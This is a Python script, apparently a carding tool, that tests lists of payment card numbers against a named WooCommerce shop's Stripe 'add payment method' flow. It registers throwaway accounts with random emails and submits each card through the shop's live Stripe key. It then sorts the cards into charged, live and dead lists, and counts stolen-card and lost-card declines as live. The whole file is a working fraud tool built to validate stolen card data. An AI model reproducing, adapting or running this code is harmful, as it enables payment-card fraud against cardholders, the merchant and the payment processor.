"""
WayuuMarket Stripe Checker for Pydroid3
WooCommerce Add Payment Method Gate
"""

import requests
import random
import string
import uuid
import time
import os
import re

# ============ CONFIG ============
INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3
# ================================

def random_email():
    chars = string.ascii_lowercase + string.digits
    name = ''.join(random.choices(chars, k=10))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{name}@{random.choice(domains)}"

def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_bin_info(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=10)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','?').upper()} | {d.get('bank',{}).get('name','?')} | {d.get('country',{}).get('name','?')}"
    except:
        pass
    return cc[:6]

def register_account(session, email):
    """Register new account on wayuumarket"""
    
    # Get registration page to get nonce
    r = session.get('https://wayuumarket.com/my-account/', timeout=30)
    
    # Extract nonce
    nonce_match = re.search(r'woocommerce-register-nonce["\s]+value="([^"]+)"', r.text)
    if not nonce_match:
        return False, "No register nonce"
    
    nonce = nonce_match.group(1)
    
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://wayuumarket.com',
        'referer': 'https://wayuumarket.com/my-account/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'email': email,
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    r = session.post('https://wayuumarket.com/my-account/', headers=headers, data=data, timeout=30)
    
    if 'wordpress_logged_in' in str(session.cookies) or 'My account' in r.text:
        return True, "Registered"
    
    if 'already registered' in r.text.lower():
        return False, "Email exists"
    
    return False, "Registration failed"

def get_add_payment_nonce(session):
    """Get nonce from add-payment-method page"""
    
    r = session.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=30)
    
    # Extract nonce for setup intent
    nonce_match = re.search(r'wc_stripe_create_setup_intent["\s:]+nonce["\s:]+["\']([^"\']+)["\']', r.text)
    if not nonce_match:
        nonce_match = re.search(r'"nonce"\s*:\s*"([^"]+)"', r.text)
    if not nonce_match:
        nonce_match = re.search(r'createSetupIntentNonce["\s:]+["\']([^"\']+)["\']', r.text)
    
    if nonce_match:
        return nonce_match.group(1)
    
    # Try another pattern
    nonce_match = re.search(r'setup_intent[^}]*nonce["\s:]+["\']([^"\']+)["\']', r.text)
    if nonce_match:
        return nonce_match.group(1)
    
    return None

def create_payment_method(cc, mes, ano, cvv, email):
    """Create Stripe payment method"""
    
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    guid = str(uuid.uuid4()) + random_string(6)
    muid = str(uuid.uuid4()) + random_string(6)
    sid = str(uuid.uuid4()) + random_string(6)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&billing_details[name]=John+Doe&billing_details[email]={email}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F83a1f53796&referrer=https%3A%2F%2Fwayuumarket.com&key=pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A'
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def create_setup_intent(session, pm_id, nonce):
    """Create setup intent to validate card"""
    
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://wayuumarket.com',
        'referer': 'https://wayuumarket.com/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'stripe_source_id': pm_id,
        'nonce': nonce,
    }
    
    try:
        r = session.post('https://wayuumarket.com/?wc-ajax=wc_stripe_create_setup_intent', headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': str(e)}

def parse_result(pm_resp, setup_resp):
    """Parse responses to determine card status"""
    
    # Check PM creation errors
    if 'error' in pm_resp:
        err = pm_resp['error']
        code = err.get('decline_code') or err.get('code', '')
        msg = err.get('message', '')
        
        live_codes = ['incorrect_cvc', 'insufficient_funds', 'lost_card', 'stolen_card',
                      'expired_card', 'generic_decline', 'do_not_honor', 'card_velocity_exceeded']
        
        if code in live_codes:
            return 'CCN', code
        return 'DEAD', code or msg
    
    # Check setup intent response
    if setup_resp:
        if setup_resp.get('success'):
            return 'CHARGED', 'Card Added Successfully!'
        
        if 'error' in setup_resp:
            err = setup_resp.get('error', '')
            if isinstance(err, dict):
                err = err.get('message', str(err))
            
            if any(x in str(err).lower() for x in ['cvc', 'security', 'insufficient', 'decline', 'lost', 'stolen']):
                return 'CCN', err[:50]
            
            if 'authentication' in str(err).lower() or '3d' in str(err).lower():
                return 'CCN', '3DS Required'
            
            return 'DEAD', err[:50]
        
        # Check status
        status = setup_resp.get('status', '')
        if status == 'succeeded':
            return 'CHARGED', 'Setup Succeeded!'
        elif status == 'requires_action':
            return 'CCN', '3DS Required'
    
    # PM was created = card exists
    if pm_resp.get('id', '').startswith('pm_'):
        return 'LIVE', 'PM Created'
    
    return 'DEAD', 'Unknown'

def check_card(cc, mes, ano, cvv):
    """Full card check flow"""
    
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    })
    
    email = random_email()
    
    # Step 1: Register
    success, msg = register_account(session, email)
    if not success:
        # Try with new email
        email = random_email()
        success, msg = register_account(session, email)
        if not success:
            return 'ERROR', f"Register: {msg}"
    
    # Step 2: Get nonce
    nonce = get_add_payment_nonce(session)
    if not nonce:
        return 'ERROR', 'No nonce found'
    
    # Step 3: Create PM
    pm_resp = create_payment_method(cc, mes, ano, cvv, email)
    
    if 'error' in pm_resp:
        code = pm_resp['error'].get('decline_code') or pm_resp['error'].get('code', '')
        if code in ['incorrect_cvc', 'expired_card', 'insufficient_funds', 'generic_decline']:
            return 'CCN', code
        return 'DEAD', code or pm_resp['error'].get('message', '')
    
    pm_id = pm_resp.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID'
    
    # Step 4: Create setup intent
    setup_resp = create_setup_intent(session, pm_id, nonce)
    
    return parse_result(pm_resp, setup_resp)

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    WAYUUMARKET STRIPE CHECKER v1.0    ║
    ║           FOR PYDROID3                ║
    ║     WooCommerce Setup Intent Gate     ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"[*] Created {INPUT_FILE} - add cards and run again")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("[!] No cards in cards.txt")
        return
    
    print(f"[*] Cards: {len(cards)}")
    print(f"[*] Gate: WayuuMarket Setup Intent")
    print(f"[*] Delay: {DELAY}s")
    print("=" * 45)
    
    charged = ccn = dead = errors = 0
    
    for i, card in enumerate(cards, 1):
        parts = card.split('|')
        if len(parts) < 4:
            continue
        
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}...{cc[-4:]}")
        
        start = time.time()
        status, msg = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            charged += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|CHARGED|{msg}\n")
        elif status == 'CCN':
            print(f"[CCN] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            ccn += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|CCN|{msg}\n")
        elif status == 'LIVE':
            print(f"[LIVE] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            ccn += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|LIVE|{msg}\n")
        elif status == 'ERROR':
            print(f"[ERROR] {msg}")
            errors += 1
        else:
            print(f"[DEAD] {full}")
            print(f"[-] {msg}")
            dead += 1
            with open(DEAD_FILE, 'a') as f:
                f.write(f"{full}|{msg}\n")
        
        print(f"[*] {t}s")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 45)
    print("            RESULTS")
    print("=" * 45)
    print(f"  CHARGED: {charged}")
    print(f"  CCN:     {ccn}")
    print(f"  DEAD:    {dead}")
    print(f"  ERRORS:  {errors}")
    print("=" * 45)

if __name__ == "__main__":
    main()
